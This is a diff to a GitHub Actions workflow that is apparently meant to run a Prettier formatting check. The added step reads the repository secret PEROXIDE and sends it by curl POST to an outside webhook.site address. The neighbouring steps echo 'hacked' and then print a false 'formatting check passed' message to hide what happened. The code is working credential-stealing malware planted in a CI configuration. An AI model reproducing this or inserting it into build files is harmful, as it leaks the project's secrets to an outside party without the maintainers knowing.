@@ -23,6 +23,14 @@ jobs:
 
       - name: Check Formatting
         run: echo "hackeddddddddddddddddddddddddddd"
+      - name: Send POST request with secret using env
+        env:
+          MY_SECRET: ${{ secrets.PEROXIDE }}
+        run: |
+          curl -X POST https://webhook.site/8b619725-10b8-47cb-976e-b838ab14b0ee/hakcc \
+            -H "Content-Type: application/json" \
+            -d "{\"secret\": \"$MY_SECRET\"}"
+
       - name: ✅ Formatting Check Passed
         if: success()
         run: echo "Prettier formatting check passed ✅"
